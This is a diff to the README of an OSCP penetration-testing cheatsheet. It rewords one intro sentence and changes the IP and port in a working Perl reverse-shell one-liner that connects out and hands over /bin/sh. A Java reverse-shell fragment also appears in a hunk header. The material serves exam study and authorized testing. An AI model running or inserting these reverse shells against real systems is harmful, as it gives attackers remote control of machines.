@@ -3,7 +3,7 @@
 The following collection is a wild (but structured) selection of commands, snippets, links, exploits, tools, lists and techniques I personally tested and used on my journey to becoming an OSCP. I will extend, restructure and update it from time to time, so let's see where this is going. 
 
 **THIS IS WORK IN PROGRESS**
-Once finished, all of the commands will also be available in a - even more structured - cherry tree file.
+Once finished, all of the commands will be available in an - even more structured - cherry tree file too.
 
 ## Disclaimer
 This cheatsheet is definitely not "complete". I am sure i forgot to write down hundreds of essential commands, used most of them in the wrong way with unnessecary flags and you'll  probably soon ask yourself how i've even made it through the exam. Also you might think a certain tool used should be in another phase of the attack (e.g certain nmap vulnerabitly scripts should be in Exploitation). That's okay, imho the edges between different stages of a penetration test are very blurry. Feel free to issue a PR if you want to help to improve the list.
@@ -804,7 +804,7 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 
 ### Reverse Shell
 ```perl
-perl -MIO -e 'use Socket;$ip="172.16.1.1";$port=53;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($port,inet_aton($ip)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+perl -MIO -e 'use Socket;$ip="192.168.0.1";$port=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($port,inet_aton($ip)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 ```
 
 ***
